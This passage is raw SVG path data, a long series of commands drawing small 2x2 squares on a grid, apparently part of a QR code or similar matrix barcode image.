M108,114l2,0 0,2 -2,0 0,-2z M114,114l2,0 0,2 -2,0 0,-2z M116,114l2,0 0,2 -2,0 0,-2z M118,114l2,0 0,2 -2,0 0,-2z M120,114l2,0 0,2 -2,0 0,-2z M124,114l2,0 0,2 -2,0 0,-2z M128,114l2,0 0,2 -2,0 0,-2z M130,114l2,0 0,2 -2,0 0,-2z M138,114l2,0 0,2 -2,0 0,-2z M140,114l2,0 0,2 -2,0 0,-2z M144,114l2,0 0,2 -2,0 0,-2z M146,114l2,0 0,2 -2,0 0,-2z M150,114l2,0 0,2 -2,0 0,-2z M158,114l2,0 0,2 -2,0 0,-2z M12,116l2,0 0,2 -2,0 0,-2z M14,116l2,0 0,2 -2,0 0,-2z M16,116l2,0 0,2 -2,0 0,-2z M20,116l2,0 0,2 -2,0 0,-2z M30,116l2,0 0,2 -2,0 0,-2z M50,116l2,0 0,2 -2,0 0,-2z M52,116l2,0 0,2 -2,0 0,-2z M54,116l2,0 0,2 -2,0 0,-2z M56,116l2,0 0,2 -2,0 0,-2z M60,116l2,0 0,2 -2,0 0,-2z M62,116l2,0 0,2 -2,0 0,-2z M64,116l2,0 0,2 -2,0 0,-2z M66,116l2,0 0,2 -2,0 0,-2z M72,116l2,0 0,2 -2,0 0,-2z M78,116l2,0 0,2 -2,0 0,-2z M82,116l2,0 0,2 -2,0 0,-2z M84,116l2,0 0,2 -2,0 0,-2z M86,116l2,0 0,2 -2,0 0,-2z M88,116l2,0 0,2 -2,0 0,-2z M90,116l2,0 0,2 -2,0 0,-2z M98,116l2,0 0,2 -2,0 0,-2z M110,116l2,0 0,2 -2,0 0,-2z M112,116l2,0 0,2 -2,0 0,-2z M114,116l2,0 0,2 -2,0 0,-2z M122,116l2,0 0,2 -2,0 0,-2z M124,116l2,0 0,2 -2,0 0,-2z M126,116l2,0 0,2 -2,0 0,-2z M128,116l2,0 0,2 -2,0 0,-2z M130,116l2,0 0,2 -2,0 0,-2z M134,116l2,0 0,2 -2,0 0,-2z M138,116l2,0 0,2 -2,0 0,-2z M144,116l2,0 0,2 -2,0 0,-2z M150,116l2,0 0,2 -2,0 0,-2z M156,116l2,0 0,2 -2,0 0,-2z M158,116l2,0 0,2 -2,0 0,-2z M160,116l2,0 0,2 -2,0 0,-2z M12,118l2,0 0,2 -2,0 0,-2z M14,118l2,0 0,2 -2,0 0,-2z M16,118l2,0 0,2 -2,0 0,-2z M22,118l2,0 0,2 -2,0 0,-2z M26,118l2,0 0,2 -2,0 0,-2z M30,118l2,0 0,2 -2,0 0,-2z M34,118l2,0 0,2 -2,0 0,-2z M40,118l2,0 0,2 -2,0 0,-2z M42,118l2,0 0,2 -2,0 0,-2z M44,118l2,0 0,2 -2,0 0,-2z M46,118l2,0 0,2 -2,0 0,-2z M48,118l2,0 0,2 -2,0 0,-2z M50,118l2,0 0,2 -2,0 0,-2z M54,118l2,0 0,2 -2,0 0,-2z M58,118l2,0 0,2 -2,0 0,-2z M60,118l2,0 0,2 -2,0 0,-2z M68,118l2,0 0,2 -2,0 0,-2z M70,118l2,0 0,2 -2,0 0,-2z M72,118l2,0 0,2 -2,0 0,-2z M74,118l2,0 0,2 -2,0 0,-2z M76,118l2,0 0,2 -2,0 0,-2z M82,118l2,0 0,2 -2,0 0,-2z M90,118l2,0 0,2 -2,0 0,-2z M104,118l2,0 0,2 -2,0 0,-2z M106,118l2,0 0,2 -2,0 0,-2z M112,118l2,0 0,2 -2,0 0,-2z M116,118l2,0 0,2 -2,0 0,-2z M122,118l2,0 0,2 -2,0 0,-2z M124,118l2,0 0,2 -2,0 0,-2z M138,118l2,0 0,2 -2,0 0,-2z M140,118l2,0 0,2 -2,0 0,-2z M142,118l2,0 0,2 -2,0 0,-2z M144,118l2,0 0,2 -2,0 0,-2z M148,118l2,0 0,2 -2,0 0,-2z M150,118l2,0 0,2 -2,0 0,-2z M158,118l2,0 0,2 -2,0 0,-2z M10,120l2,0 0,2 -2,0 0,-2z M16,120l2,0 0,2 -2,0 0,-2z M20,120l2,0 0,2 -2,0 0,-2z M22,120l2,0 0,2 -2,0 0,-2z M24,120l2,0 0,2 -2,0 0,-2z M32,120l2,0 0,2 -2,0 0,-2z M36,120l2,0 0,2 -2,0 0,-2z M38,120l2,0 0,2 -2,0 0,-2z M40,120l2,0 0,2 -2,0 0,-2z M42,120l2,0 0,2 -2,0 0,-2z M44,120l2,0 0,2 -2,0 0,-2z M46,120l2,0 0,2 -2,0 0,-2z M48,120l2,0 0,2 -2,0 0,-2z M50,120l2,0 0,2 -2,0 0,-2z M52,120l2,0 0,2 -2,0 0,-2z M54,120l2,0 0,2 -2,0 0,-2z M56,120l2,0 0,2 -2,0 0,-2z M58,120l2,0 0,2 -2,0 0,-2z M60,120l2,0 0,2 -2,0 0,-2z M64,120l2,0 0,2 -2,0 0,-2z M68,120l2,0 0,2 -2,0 0,-2z M70,120l2,0 0,2 -2,0 0,-2z M76,120l2,0 0,2 -2,0 0,-2z M82,120l2,0 0,2 -2,0 0,-2z M86,120l2,0 0,2 -2,0 0,-2z M88,120l2,0 0,2 -2,0 0,-2z M90,120l2,0 0,2 -2,0 0,-2z M92,120l2,0 0,2 -2,0 0,-2z M94,120l2,0 0,2 -2,0 0,-2z M96,120l2,0 0,2 -2,0 0,-2z M98,120l2,0 0,2 -2,0 0,-2z M100,120l2,0 0,2 -2,0 0,-2z M108,120l2,0 0,2 -2,0 0,-2z M116,120l2,0 0,2 -2,0 0,-2z M120,120l2,0 0,2 -2,0 0,-2z M124,120l2,0 0,2 -2,0 0,-2z M126,120l2,0 0,2 -2,0 0,-2z M128,120l2,0 0,2 -2,0 0,-2z M134,120l2,0 0,2 -2,0 0,-2z M136,120l2,0 0,2 -2,0 0,-2z M138,120l2,0 0,2 -2,0 0,-2z M142,120l2,0 0,2 -2,0 0,-2z M148,120l2,0 0,2 -2,0 0,-2z M154,120l2,0 0,2 -2,0 0,-2z M158,120l2,0 0,2 -2,0 0,-2z M8,122l2,0 0,2 -2,0 0,-2z M12,122l2,0 0,2 -2,0 0,-2z M14,122l2,0 0,2 -2,0 0,-2z M16,122l2,0 0,2 -2,0 0,-2z M22,122l2,0 0,2 -2,0 0,-2z M24,122l2,0 0,2 -2,0 0,-2z M30,122l2,0 0,2 -2,0 0,-2z M32,122l2,0 0,2 -2,0 0,-2z M38,122l2,0 0,2 -2,0 0,-2z M42,122l2,0 0,2 -2,0 0,-2z M44,122l2,0 0,2 -2,0 0,-2z M46,122l2,0 0,2 -2,0 0,-2z M50,122l2,0 0,2 -2,0 0,-2z M52,122l2,0 0,2 -2,0 0,-2z M56,122l2,0 0,2 -2,0 0,-2z M58,122l2,0 0,2 -2,0 0,-2z M60,122l2,0 0,2 -2,0 0,-2z M62,122l2,0 0,2 -2,0 0,-2z M64,122l2,0 0,2 -2,0 0,-2z M70,122l2,0 0,2 -2,0 0,-2z M74,122l2,0 0,2 -2,0 0,-2z M76,122l2,0 0,2 -2,0 0,-2z M88,122l2,0 0,2 -2,0 0,-2z M92,122l2,0 0,2 -2,0 0,-2z M100,122l2,0 0,2 -2,0 0,-2z M104,122l2,0 0,2 -2,0 0,-2z M108,122l2,0 0,2 -2,0 0,-2z M110,122l2,0 0,2 -2,0 0,-2z M120,122l2,0 0,2 -2,0 0,-2z M122,122l2,0 0,2 -2,0 0,-2z M124,122l2,0 0,2 -2,0 0,-2z M126,122l2,0 0,2 -2,0 0,-2z M136,122l2,0 0,2 -2,0 0,-2z M138,122l2,0 0,2 -2,0 0,-2z M140,122l2,0 0,2 -2,0 0,-2z M148,122l2,0 0,2 -2,0 0,-2z M150,122l2,0 0,2 -2,0 0,-2z M152,122l2,0 0,2 -2,0 0,-2z M156,122l2,0 0,2 -2,0 0,-2z M158,122l2,0 0,2 -2,0 0,-2z M160,122l2,0 0,2 -2,0 0,-2z M8,124l2,0 0,2 -2,0 0,-2z M10,124l2,0 0,2 -2,0 0,-2z M14,124l2,0 0,2 -2,0 0,-2z M18,124l2,0 0,2 -2,0 0,-2z M20,124l2,0 0,2 -2,0 0,-2z M22,124l2,0 0,2 -2,0 0,-2z M24,124l2,0 0,2 -2,0 0,-2z M28,124l2,0 0,2 -2,0 0,-2z M32,124l2,0 0,2 -2,0 0,-2z M38,124l2,0 0,2 -2,0 0,-2z M44,124l2,0 0,2 -2,0 0,-2z M46,124l2,0 0,2 -2,0 0,-2z M50,124l2,0 0,2 -2,0 0,-2z M52,124l2,0 0,2 -2,0 0,-2z M54,124l2,0 0,2 -2,0 0,-2z M60,124l2,0 0,2 -2,0 0,-2z M62,124l2,0 0,2 -2,0 0,-2z M64,124l2,0 0,2 -2,0 0,-2z M70,124l2,0 0,2 -2,0 0,-2z M72,124l2,0 0,2 -2,0 0,-2z M76,124l2,0 0,2 -2,0 0,-2z M78,124l2,0 0,2 -2,0 0,-2z M84,124l2,0 0,2 -2,0 0,-2z M86,124l2,0 0,2 -2,0 0,-2z M88,124l2,0 0,2 -2,0 0,-2z M94,124l2,0 0,2 -2,0 0,-2z M96,124l2,0 0,2 -2,0 0,-2z M98,124l2,0 0,2 -2,0 0,-2z M100,124l2,0 0,2 -2,0 0,-2z M112,124l2,0 0,2 -2,0 0,-2z M116,124l2,0 0,2 -2,0 0,-2z M122,124l2,0 0,2 -2,0 0,-2z M124,124l2,0 0,2 -2,0 0,-2z M126,124l2,0 0,2 -2,0 0,-2z M128,124l2,0 0,2 -2,0 0,-2z M134,124l2,0 0,2 -2,0 0,-2z M136,124l2,0 0,2 -2,0 0,-2z M142,124l2,0 0,2 -2,0 0,-2z M146,124l2,0 0,2 -2,0 0,-2z M152,124l2,0 0,2 -2,0 0,-2z M154,124l2,0 0,2 -2,0 0,-2z M158,124l2,0 0,2 -2,0 0,-2z M8,126l2,0 0,2 -2,0 0,-2z M10,126l2,0 0,2 -2,0 0,-2z M12,126l2,0 0,2 -2,0 0,-2z M18,126l2,0 0,2 -2,0 0,-2z M22,126l2,0 0,2 -2,0 0,-2z M24,126l2,0 0,2 -2,0 0,-2z M26,126l2,0 0,2 -2,0 0,-2z M30,126l2,0 0,2 -2,0 0,-2z M34,126l2,0 0,2 -2,0 0,-2z M36,126l2,0 0,2 -2,0 0,-2z M38,126l2,0 0,2 -2,0 0,-2z M42,126l2,0 0,2 -2,0 0,-2z M50,126l2,0 0,2 -2,0 0,-2z M52,126l2,0 0,2 -2,0 0,-2z M68,126l2,0 0,2 -2,0 0,-2z M74,126l2,0 0,2 -2,0 0,-2z M76,126l2,0 0,2 -2,0 0,-2z M78,126l2,0 0,2 -2,0 0,-2z M82,126l2,0 0,2 -2,0 0,-2z M84,126l2,0 0,2 -2,0 0,-2z M86,126l2,0 0,2 -2,0 0,-2z M90,126l2,0 0,2 -2,0 0,-2z M96,126l2,0 0,2 -2,0 0,-2z M104,126l2,0 0,2 -2,0 0,-2z M108,126l2,0 0,2 -2,0 0,-2z M120,126l2,0 0,2 -2,0 0,-2z M130,126l2,0 0,2 -2,0 0,-2z M132,126l2,0 0,2 -2,0 0,-2z M140,126l2,0 0,2 -2,0 0,-2z M142,126l2,0 0,2 -2,0 0,-2z M144,126l2,0 0,2 -2,0 0,-2z M146,126l2,0 0,2 -2,0 0,-2z M150,126l2,0 0,2 -2,0 0,-2z M152,126l2,0 0,2 -2,0 0,-2z M158,126l2,0 0,2 -2,0 0,-2z M8,128l2,0 0,2 -2,0 0,-2z M14,128l2,0 0,2 -2,0 0,-2z M20,128l2,0 0,2 -2,0 0,-2z M22,128l2,0 0,2 -2,0 0,-2z M24,128l2,0 0,2 -2,0 0,-2z M28,128l2,0 0,2 -2,0 0,-2z M36,128l2,0 0,2 -2,0 0,-2z M38,128l2,0 0,2 -2,0 0,-2z M42,128l2,0 0,2 -2,0 0,-2z M46,128l2,0 0,2 -2,0 0,-2z M48,128l2,0 0,2 -2,0 0,-2z M50,128l2,0 0,2 -2,0 0,-2z M54,128l2,0 0,2 -2,0 0,-2z M56,128l2,0 0,2 -2,0 0,-2z M60,128l2,0 0,2 -2,0 0,-2z M62,128l2,0 0,2 -2,0 0,-2z M64,128l2,0 0,2 -2,0 0,-2z M70,128l2,0 0,2 -2,0 0,-2z M72,128l2,0 0,2 -2,0 0,-2z M80,128l2,0 0,2 -2,0 0,-2z M90,128l2,0 0,2 -2,0 0,-2z M94,128l2,0 0,2 -2,0 0,-2z M96,128l2,0 0,2 -2,0 0,-2z M98,128l2,0 0,2 -2,0 0,-2z M102,128l2,0 0,2 -2,0 0,-2z M106,128l2,0 0,2 -2,0 0,-2z M108,128l2,0 0,2 -2,0 0,-2z M110,128l2,0 0,2 -2,0 0,-2z M120,128l2,0 0,2 -2,0 0,-2z M122,128l2,0 0,2 -2,0 0,-2z M124,128l2,0 0,2 -2,0 0,-2z M128,128l2,0 0,2 -2,0 0,-2z M134,128l2,0 0,2 -2,0 0,-2z M138,128l2,0 0,2 -2,0 0,-2z M140,128l2,0 0,2 -2,0 0,-2z M144,128l2,0 0,2 -2,0 0,-2z M146,128l2,0 0,2 -2,0 0,-2z M148,128l2,0 0,2 -2,0 0,-2z M156,128l2,0 0,2 -2,0 0,-2z M158,128l2,0 0,2 -2,0 0,-2z M160,128l2,0 0,2 -2,0 0,-2z M10,130l2,0 0,2 -2,0 0,-2z M28,130l2,0 0,2 -2,0 0,-2z M34,130l2,0 0,2 -2,0 0,-2z M36,130l2,0 0,2 -2,0 0,-2z M38,130l2,0 0,2 -2,0 0,-2z M46,130l2,0 0,2 -2,0 0,-2z M50,130l2,0 0,2 -2,0 0,-2z M52,130l2,0 0,2 -2,0 0,-2z M56,130l2,0 0,2 -2,0 0,-2z M62,130l2,0 0,2 -2,0 0,-2z M64,130l2,0 0,2 -2,0 0,-2z M68,130l2,0 0,2 -2,0 0,-2z M70,130l2,0 0,2 -2,0 0,-2z M72,130l2,0 0,2 -2,0 0,-2z M74,130l2,0 0,2 -2,0 0,-2z M78,130l2,0 0,2 -2,0 0,-2z M86,130l2,0 0,2 -2,0 0,-2z M94,130l2,0 0,2 -2,0 0,-2z M104,130l2,0 0,2 -2,0 0,-2z M106,130l2,0 0,2 -2,0 0,-2z M108,130l2,0 0,2 -2,0 0,-2z M116,130l2,0 0,2 -2,0 0,-2z M118,130l2,0 0,2 -2,0 0,-2z M120,130l2,0 0,2 -2,0 0,-2z M124,130l2,0 0,2 -2,0 0,-2z M126,130l2,0 0,2 -2,0 0,-2z M130,130l2,0 0,2 -2,0 0,-2z M144,130l2,0 0,2 -2,0 0,-2z M146,130l2,0 0,2 -2,0 0,-2z M150,130l2,0 0,2 -2,0 0,-2z M152,130l2,0 0,2 -2,0 0,-2z M154,130l2,0 0,2 -2,0 0,-2z M156,130l2,0 0,2 -2,0 0,-2z M158,130l2,0 0,2 -2,0 0,-2z M10,132l2,0 0,2 -2,0 0,-2z M14,132l2,0 0,2 -2,0 0,-2z M20,132l2,0 0,2 -2,0 0,-2z M22,132l2,0 0,2 -2,0 0,-2z M24,132l2,0 0,2 -2,0 0,-2z M28,132l2,0 0,2 -2,0 0,-2z M36,132l2,0 0,2 -2,0 0,-2z M40,132l2,0 0,2 -2,0 0,-2z M42,132l2,0 0,2 -2,0 0,-2z M46,132l2,0 0,2 -2,0 0,-2z M48,132l2,0 0,2 -2,0 0,-2z M50,132l2,0 0,2 -2,0 0,-2z M56,132l2,0 0,2 -2,0 0,-2z M58,132l2,0 0,2 -2,0 0,-2z M66,132l2,0 0,2 -2,0 0,-2z M68,132l2,0 0,2 -2,0 0,-2z M70,132l2,0 0,2 -2,0 0,-2z M76,132l2,0 0,2 -2,0 0,-2z M82,132l2,0 0,2 -2,0 0,-2z M84,132l2,0 0,2 -2,0 0,-2z M86,132l2,0 0,2 -2,0 0,-2z M94,132l2,0 0,2 -2,0 0,-2z M96,132l2,0 0,2 -2,0 0,-2z M98,132l2,0 0,2 -2,0 0,-2z M100,132l2,0 0,2 -2,0 0,-2z M106,132l2,0 0,2 -2,0 0,-2z M108,132l2,0 0,2 -2,0 0,-2z M110,132l2,0 0,2 -2,0 0,-2z M114,132l2,0 0,2 -2,0 0,-2z M118,132l2,0 0,2 -2,0 0,-2z M120,132l2,0 0,2 -2,0 0,-2z M122,132l2,0 0,2 -2,0 0,-2z M126,132l2,0 0,2 -2,0 0,-2z M128,132l2,0 0,2 -2,0 0,-2z M132,132l2,0 0,2 -2,0 0,-2z M134,132l2,0 0,2 -2,0 0,-2z M140,132l2,0 0,2 -2,0 0,-2z M142,132l2,0 0,2 -2,0 0,-2z M148,132l2,0 0,2 -2,0 0,-2z M152,132l2,0 0,2 -2,0 0,-2z M156,132l2,0 0,2 -2,0 0,-2z M158,132l2,0 0,2 -2,0 0,-2z M14,134l2,0 0,2 -2,0 0,-2z M22,134l2,0 0,2 -2,0 0,-2z M24,134l2,0 0,2 -2,0 0,-2z M26,134l2,0 0,2 -2,0 0,-2z M28,134l2,0 0,2 -2,0 0,-2z M30,134l2,0 0,2 -2,0 0,-2z M36,134l2,0 0,2 -2,0 0,-2z M42,134l2,0 0,2 -2,0 0,-2z M46,134l2,0 0,2 -2,0 0,-2z M50,134l2,0 0,2 -2,0 0,-2z M52,134l2,0 0,2 -2,0 0,-2z M54,134l2,0 0,2 -2,0 0,-2z M56,134l2,0 0,2 -2,0 0,-2z M58,134l2,0 0,2 -2,0 0,-2z M64,134l2,0 0,2 -2,0 0,-2z M68,134l2,0 0,2 -2,0 0,-2z M72,134l2,0 0,2 -2,0 0,-2z M74,134l2,0 0,2 -2,0 0,-2z M82,134l2,0 0,2 -2,0 0,-2z M88,134l2,0 0,2 -2,0 0,-2z M92,134l2,0 0,2 -2,0 0,-2z M94,134l2,0 0,2 -2,0 0,-2z M96,134l2,0 0,2 -2,0 0,-2z M100,134l2,0 0,2 -2,0 0,-2z M104,134l2,0 0,2 -2,0 0,-2z M106,134l2,0 0,2 -2,0 0,-2z M108,134l2,0 0,2 -2,0 0,-2z M120,134l2,0 0,2 -2,0 0,-2z M122,134l2,0 0,2 -2,0 0,-2z M132,134l2,0 0,2 -2,0 0,-2z M134,134l2,0 0,2 -2,0 0,-2z M136,134l2,0 0,2 -2,0 0,-2z M138,134l2,0 0,2 -2,0 0,-2z M142,134l2,0 0,2 -2,0 0,-2z M154,134l2,0 0,2 -2,0 0,-2z M158,134l2,0 0,2 -2,0 0,-2z M160,134l2,0 0,2 -2,0 0,-2z M8,136l2,0 0,2 -2,0 0,-2z M10,136l2,0 0,2 -2,0 0,-2z M16,136l2,0 0,2 -2,0 0,-2z M20,136l2,0 0,2 -2,0 0,-2z M22,136l2,0 0,2 -2,0 0,-2z M24,136l2,0 0,2 -2,0 0,-2z M32,136l2,0 0,2 -2,0 0,-2z M34,136l2,0 0,2 -2,0 0,-2z M38,136l2,0 0,2 -2,0 0,-2z M40,136l2,0 0,2 -2,0 0,-2z M42,136l2,0 0,2 -2,0 0,-2z M46,136l2,0 0,2 -2,0 0,-2z M50,136l2,0 0,2 -2,0 0,-2z M52,136l2,0 0,2 -2,0 0,-2z M58,136l2,0 0,2 -2,0 0,-2z M64,136l2,0 0,2 -2,0 0,-2z M66,136l2,0 0,2 -2,0 0,-2z M76,136l2,0 0,2 -2,0 0,-2z M82,136l2,0 0,2 -2,0 0,-2z M86,136l2,0 0,2 -2,0 0,-2z M88,136l2,0 0,2 -2,0 0,-2z M100,136l2,0 0,2 -2,0 0,-2z M108,136l2,0 0,2 -2,0 0,-2z M114,136l2,0 0,2 -2,0 0,-2z M120,136l2,0 0,2 -2,0 0,-2z M124,136l2,0 0,2 -2,0 0,-2z M126,136l2,0 0,2 -2,0 0,-2z M128,136l2,0 0,2 -2,0 0,-2z M134,136l2,0 0,2 -2,0 0,-2z M136,136l2,0 0,2 -2,0 0,-2z M138,136l2,0 0,2 -2,0 0,-2z M142,136l2,0 0,2 -2,0 0,-2z M148,136l2,0 0,2 -2,0 0,-2z M150,136l2,0 0,2 -2,0 0,-2z M152,136l2,0 0,2 -2,0 0,-2z M158,136l2,0 0,2 -2,0 0,-2z M8,138l2,0 0,2 -2,0 0,-2z M14,138l2,0 0,2 -2,0 0,-2z M22,138l2,0 0,2 -2,0 0,-2z M28,138l2,0 0,2 -2,0 0,-2z M30,138l2,0 0,2 -2,0 0,-2z M32,138l2,0 0,2 -2,0 0,-2z M34,138l2,0 0,2 -2,0 0,-2z M38,138l2,0 0,2 -2,0 0,-2z M40,138l2,0 0,2 -2,0 0,-2z M46,138l2,0 0,2 -2,0 0,-2z M48,138l2,0 0,2 -2,0 0,-2z M50,138l2,0 0,2 -2,0 0,-2z M54,138l2,0 0,2 -2,0 0,-2z M56,138l2,0 0,2 -2,0 0,-2z M60,138l2,0 0,2 -2,0 0,-2z M68,138l2,0 0,2 -2,0 0,-2z M70,138l2,0 0,2 -2,0 0,-2z M74,138l2,0 0,2 -2,0 0,-2z M82,138l2,0 0,2 -2,0 0,-2z M92,138l2,0 0,2 -2,0 0,-2z M94,138l2,0 0,2 -2,0 0,-2z M98,138l2,0 0,2 -2,0 0,-2z M100,138l2,0 0,2 -2,0 0,-2z M104,138l2,0 0,2 -2,0 0,-2z M106,138l2,0 0,2 -2,0 0,-2z M110,138l2,0 0,2 -2,0 0,-2z M112,138l2,0 0,2 -2,0 0,-2z M116,138l2,0 0,2 -2,0 0,-2z M122,138l2,0 0,2 -2,0 0,-2z M126,138l2,0 0,2 -2,0 0,-2z M132,138l2,0 0,2 -2,0 0,-2z M134,138l2,0 0,2 -2,0 0,-2z M138,138l2,0 0,2 -2,0 0,-2z M140,138l2,0 0,2 -2,0 0,-2z M144,138l2,0 0,2 -2,0 0,-2z M152,138l2,0 0,2 -2,0 0,-2z M158,138l2,0 0,2 -2,0 0,-2z M10,140l2,0 0,2 -2,0 0,-2z M16,140l2,0 0,2 -2,0 0,-2z M18,140l2,0 0,2 -2,0 0,-2z M20,140l2,0 0,2 -2,0 0,-2z M30,140l2,0 0,2 -2,0 0,-2z M32,140l2,0 0,2 -2,0 0,-2z M34,140l2,0 0,2 -2,0 0,-2z M38,140l2,0 0,2 -2,0 0,-2z M40,140l2,0 0,2 -2,0 0,-2z M44,140l2,0 0,2 -2,0 0,-2z M46,140l2,0 0,2 -2,0 0,-2z M48,140l2,0 0,2 -2,0 0,-2z M50,140l2,0 0,2 -2,0 0,-2z M56,140l2,0 0,2 -2,0 0,-2z M58,140l2,0 0,2 -2,0 0,-2z M60,140l2,0 0,2 -2,0 0,-2z M62,140l2,0 0,2 -2,0 0,-2z M64,140l2,0 0,2 -2,0 0,-2z M66,140l2,0 0,2 -2,0 0,-2z M68,140l2,0 0,2 -2,0 0,-2z M82,140l2,0 0,2 -2,0 0,-2z M84,140l2,0 0,2 -2,0 0,-2z M86,140l2,0 0,2 -2,0 0,-2z M92,140l2,0 0,2 -2,0 0,-2z M94,140l2,0 0,2 -2,0 0,-2z M96,140l2,0 0,2 -2,0 0,-2z M100,140l2,0 0,2 -2,0 0,-2z M102,140l2,0 0,2 -2,0 0,-2z M116,140l2,0 0,2 -2,0 0,-2z M118,140l2,0 0,2 -2,0 0,-2z M122,140l2,0 0,2 -2,0 0,-2z M128,140l2,0 0,2 -2,0 0,-2z M130,140l2,0 0,2 -2,0 0,-2z M132,140l2,0 0,2 -2,0 0,-2z M134,140l2,0 0,2 -2,0 0,-2z M136,140l2,0 0,2 -2,0 0,-2z M138,140l2,0 0,2 -2,0 0,-2z M144,140l2,0 0,2 -2,0 0,-2z M146,140l2,0 0,2 -2,0 0,-2z M148,140l2,0 0,2 -2,0 0,-2z M152,140l2,0 0,2 -2,0 0,-2z M156,140l2,0 0,2 -2,0 0,-2z M158,140l2,0 0,2 -2,0 0,-2z M160,140l2,0 0,2 -2,0 0,-2z M16,142l2,0 0,2 -2,0 0,-2z M22,142l2,0 0,2 -2,0 0,-2z M24,142l2,0 0,2 -2,0 0,-2z M26,142l2,0 0,2 -2,0 0,-2z M28,142l2,0 0,2 -2,0 0,-2z M30,142l2,0 0,2 -2,0 0,-2z M38,142l2,0 0,2 -2,0 0,-2z M42,142l2,0 0,2 -2,0 0,-2z M44,142l2,0 0,2 -2,0 0,-2z M46,142l2,0 0,2 -2,0 0,-2z M48,142l2,0 0,2 -2,0 0,-2z M50,142l2,0 0,2 -2,0 0,-2z M52,142l2,0 0,2 -2,0 0,-2z M54,142l2,0 0,2 -2,0 0,-2z M56,142l2,0 0,2 -2,0 0,-2z M60,142l2,0 0,2 -2,0 0,-2z M68,142l2,0 0,2 -2,0 0,-2z M74,142l2,0 0,2 -2,0 0,-2z M78,142l2,0 0,2 -2,0 0,-2z M82,142l2,0 0,2 -2,0 0,-2z M84,142l2,0 0,2 -2,0 0,-2z M86,142l2,0 0,2 -2,0 0,-2z M92,142l2,0 0,2 -2,0 0,-2z M100,142l2,0 0,2 -2,0 0,-2z M104,142l2,0 0,2 -2,0 0,-2z M114,142l2,0 0,2 -2,0 0,-2z M116,142l2,0 0,2 -2,0 0,-2z M122,142l2,0 0,2 -2,0 0,-2z M130,142l2,0 0,2 -2,0 0,-2z M132,142l2,0 0,2 -2,0 0,-2z M134,142l2,0 0,2 -2,0 0,-2z M140,142l2,0 0,2 -2,0 0,-2z M142,142l2,0 0,2 -2,0 0,-2z M144,142l2,0 0,2 -2,0 0,-2z M146,142l2,0 0,2 -2,0 0,-2z M152,142l2,0 0,2 -2,0 0,-2z M158,142l2,0 0,2 -2,0 0,-2z M10,144l2,0 0,2 -2,0 0,-2z M12,144l2,0 0,2 -2,0 0,-2z M14,144l2,0 0,2 -2,0 0,-2z M16,144l2,0 0,2 -2,0 0,-2z M20,144l2,0 0,2 -2,0 0,-2z M26,144l2,0 0,2 -2,0 0,-2z M30,144l2,0 0,2 -2,0 0,-2z M34,144l2,0 0,2 -2,0 0,-2z M38,144l2,0 0,2 -2,0 0,-2z M40,144l2,0 0,2 -2,0 0,-2z M44,144l2,0 0,2 -2,0 0,-2z M46,144l2,0 0,2 -2,0 0,-2z M50,144l2,0 0,2 -2,0 0,-2z M52,144l2,0 0,2 -2,0 0,-2z M56,144l2,0 0,2 -2,0 0,-2z M58,144l2,0 0,2 -2,0 0,-2z M60,144l2,0 0,2 -2,0 0,-2z M62,144l2,0 0,2 -2,0 0,-2z M64,144l2,0 0,2 -2,0 0,-2z M66,144l2,0 0,2 -2,0 0,-2z M76,144l2,0 0,2 -2,0 0,-2z M78,144l2,0 0,2 -2,0 0,-2z M80,144l2,0 0,2 -2,0 0,-2z M82,144l2,0 0,2 -2,0 0,-2z M88,144l2,0 0,2 -2,0 0,-2z M94,144l2,0 0,2 -2,0 0,-2z M96,144l2,0 0,2 -2,0 0,-2z M98,144l2,0 0,2 -2,0 0,-2z M100,144l2,0 0,2 -2,0 0,-2z M102,144l2,0 0,2 -2,0 0,-2z M104,144l2,0 0,2 -2,0 0,-2z M106,144l2,0 0,2 -2,0 0,-2z M108,144l2,0 0,2 -2,0 0,-2z M110,144l2,0 0,2 -2,0 0,-2z M112,144l2,0 0,2 -2,0 0,-2z M114,144l2,0 0,2 -2,0 0,-2z M120,144l2,0 0,2 -2,0 0,-2z M124,144l2,0 0,2 -2,0 0,-2z M126,144l2,0 0,2 -2,0 0,-2z M128,144l2,0 0,2 -2,0 0,-2z M130,144l2,0 0,2 -2,0 0,-2z M132,144l2,0 0,2 -2,0 0,-2z M134,144l2,0 0,2 -2,0 0,-2z M140,144l2,0 0,2 -2,0 0,-2z M142,144l2,0 0,2 -2,0 0,-2z M144,144l2,0 0,2 -2,0 0,-2z M146,144l2,0 0,2 -2,0 0,-2z M148,144l2,0 0,2 -2,0 0,-2z M150,144l2,0 0,2 -2,0 0,-2z M152,144l2,0 0,2 -2,0 0,-2z M154,144l2,0 0,2 -2,0 0,-2z M158,144l2,0 0,2 -2,0 0,-2z M24,146l2,0 0,2 -2,0 0,-2z M28,146l2,0 0,2 -2,0 0,-2z M34,146l2,0 0,2 -2,0 0,-2z M36,146l2,0 0,2 -2,0 0,-2z M38,146l2,0 0,2 -2,0 0,-2z M40,146l2,0 0,2 -2,0 0,-2z M42,146l2,0 0,2 -2,0 0,-2z M46,146l2,0 0,2 -2,0 0,-2z M50,146l2,0 0,2 -2,0 0,-2z M54,146l2,0 0,2 -2,0 0,-2z M56,146l2,0 0,2 -2,0 0,-2z M64,146l2,0 0,2 -2,0 0,-2z M68,146l2,0 0,2 -2,0 0,-2z M70,146l2,0 0,2 -2,0 0,-2z M76,146l2,0 0,2 -2,0 0,-2z M78,146l2,0 0,2 -2,0 0,-2z M82,146l2,0 0,2 -2,0 0,-2z M84,146l2,0 0,2 -2,0 0,-2z M86,146l2,0 0,2 -2,0 0,-2z M88,146l2,0 0,2 -2,0 0,-2z M92,146l2,0 0,2 -2,0 0,-2z M100,146l2,0 0,2 -2,0 0,-2z M108,146l2,0 0,2 -2,0 0,-2z M112,146l2,0 0,2 -2,0 0,-2z M114,146l2,0 0,2 -2,0 0,-2z M116,146l2,0 0,2 -2,0 0,-2z M120,146l2,0 0,2 -2,0 0,-2z M124,146l2,0 0,2 -2,0 0,-2z M126,146l2,0 0,2 -2,0 0,-2z M130,146l2,0 0,2 -2,0 0,-2z M132,146l2,0 0,2 -2,0 0,-2z M134,146l2,0 0,2 -2,0 0,-2z M136,146l2,0 0,2 -2,0 0,-2z M144,146l2,0 0,2 -2,0 0,-2z M152,146l2,0 0,2 -2,0 0,-2z M154,146l2,0 0,2 -2,0 0,-2z M8,148l2,0 0,2 -2,0 0,-2z M10,148l2,0 0,2 -2,0 0,-2z M12,148l2,0 0,2 -2,0 0,-2z M14,148l2,0 0,2 -2,0 0,-2z M16,148l2,0 0,2 -2,0 0,-2z M18,148l2,0 0,2 -2,0 0,-2z M20,148l2,0 0,2 -2,0 0,-2z 